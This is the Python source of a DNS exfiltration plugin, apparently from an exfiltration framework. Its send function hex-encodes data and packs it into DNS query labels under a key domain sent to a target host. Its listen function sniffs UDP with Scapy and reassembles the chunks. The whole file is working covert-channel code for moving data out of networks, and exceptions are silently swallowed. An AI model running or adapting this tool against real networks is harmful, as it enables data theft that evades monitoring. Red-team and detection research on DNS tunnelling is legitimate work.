from dnslib import *
try:
    from scapy.all import *
except:
    print "You should install Scapy if you run the server.."

app_exfiltrate = None
config = None
buf = {}

def handle_dns_packet(x):
    global buf
    try:
        qname = x.payload.payload.payload.qd.qname
        if (config['key'] in qname):
            app_exfiltrate.log_message(
                'info', '[dns] DNS Query: {0}'.format(qname))
            jobid = qname[0:7]
            data = ''.join(qname[7:].replace(config['key'], '').split('.'))
            # app_exfiltrate.log_message('info', '[dns] jobid = {0}'.format(jobid))
            # app_exfiltrate.log_message('info', '[dns] data = {0}'.format(data))
            if jobid not in buf:
                buf[jobid] = []
            if data not in buf[jobid]:
                buf[jobid].append(data)
            #Handle the case where the last label's length == 1
            last_label_len = (252 - len(config['key'])) % 64
            max_query = 252 if last_label_len == 1 else 253
            if (len(qname) < max_query):
                app_exfiltrate.retrieve_data(''.join(buf[jobid]).decode('hex'))
                buf[jobid] = []
    except Exception, e:
        # print e
        pass

#Send data over multiple labels (RFC 1034)
#Max query is 253 characters long (textual representation)
#Max label length is 63 bytes
def send(data):
    target = config['target']
    port = config['port']
    jobid = data.split("|!|")[0]
    data = data.encode('hex')
    domain = ""

    #Calculate the remaining length available for our payload
    rem = 252 - len(config['key'])
    #Number of 63 bytes labels
    no_labels = rem / 64 #( 63 + len('.') )
    #Length of the last remaining label
    last_label_len = (rem % 64) - 1

    while data != "":
        data = jobid + data
        for i in range(0, no_labels):
            if data == "": break
            label = data[:63]
            data = data[63:]
            domain += label + '.'
        if data == "":
            domain += config['key']
        else:
            if last_label_len < 1:
                domain += config['key']
            else:
                label = data[:last_label_len]
                data = data[last_label_len:]
                domain += label + '.' + config['key']
        q = DNSRecord.question(domain)
        domain = ""
        try:
            q.send(target, port, timeout=0.01)
        except:
            # app_exfiltrate.log_message('warning', "[dns] Failed to send DNS request")
            pass

def listen():
    app_exfiltrate.log_message(
        'info', "[dns] Waiting for DNS packets for domain {0}".format(config['key']))
    sniff(filter="udp and port {}".format(
        config['port']), prn=handle_dns_packet)


class Plugin:

    def __init__(self, app, conf):
        global app_exfiltrate, config
        config = conf
        app.register_plugin('dns', {'send': send, 'listen': listen})
        app_exfiltrate = app
